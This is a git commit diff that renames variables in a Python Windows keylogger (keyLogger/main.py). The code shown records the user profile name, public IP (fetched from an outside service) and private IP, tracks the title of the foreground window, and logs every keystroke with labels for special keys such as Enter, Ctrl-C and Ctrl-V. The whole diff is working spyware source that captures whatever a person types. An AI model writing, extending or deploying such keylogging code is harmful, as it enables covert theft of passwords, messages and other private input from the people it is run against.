1ae4a5a6363e01a23f37b3dcb1b941d04ed14517
manishfsb <mnshbsnt@gmail.com>
2020-11-17 23:31:50 -0500

    Giving the variables better representative names

--- keyLogger/main.py
+++ keyLogger/main.py
@@ -5,44 +5,44 @@ import requests
 import socket
 import win32gui
 
-datetime = time.ctime(time.time())
+absoluteTime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
 
-msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
-logged_data = []
-logged_data.append(msg)
+msg = f'[START OF LOGS]\n  *~ Date/Time: {absoluteTime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+displayData = []
+displayData.append(msg)
 
-old_app = ''
-delete_file = []
+currentApp = ''
+
 
 def on_press(key):
-    global old_app
+    global currentApp
 
-    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    nextApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-    if new_app == 'Cortana':
-        new_app = 'Windows Start Menu'
+    if nextApp == 'Cortana':
+        nextApp = 'Windows Start Menu'
     else:
         pass
 
-    if new_app != old_app and new_app != '':
-        logged_data.append(f'[{datetime}] ~ {new_app}\n')
-        old_app = new_app
+    if nextApp != currentApp and nextApp != '':
+        displayData.append(f'[{absoluteTime}] ~ {nextApp}\n')
+        currentApp = nextApp
     else:
         pass
 
-    substitution = {'Key.enter' : '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
+    unclear_keys = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
                     'Key.alt_l': '[ALT]', 'Key.tab': '[TAB]', 'Key.delete': '[DEL]', 'Key.ctrl_l': '[CTRL]',
                     'Key.left': '[LEFT ARROW]', 'Key.right': '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', '\\x13':
-                    '[CTRL-S]', '\\x17': '[CTRL-W]', 'Key.caps_lock': '[CAPS LK]', '\\x01': '[CTRL-A]', 'Key.cmd':
-                    '[WINDOWS KEY]', 'Key.print_screen': '[PRNT SCR]', '\\x03': '[CTRL-C]', '\\x16': '[CTRL-V]'}
+                        '[CTRL-S]', '\\x17': '[CTRL-W]', 'Key.caps_lock': '[CAPS LK]', '\\x01': '[CTRL-A]', 'Key.cmd':
+                        '[WINDOWS KEY]', 'Key.print_screen': '[PRNT SCR]', '\\x03': '[CTRL-C]', '\\x16': '[CTRL-V]'}
 
     key = str(key).strip('\'')
-    
-    if key in substitution:
-        logged_data.append(substitution[key])
+
+    if key in unclear_keys:
+        displayData.append(unclear_keys[key])
     else:
-        logged_data.append(key)
+        displayData.append(key)
 
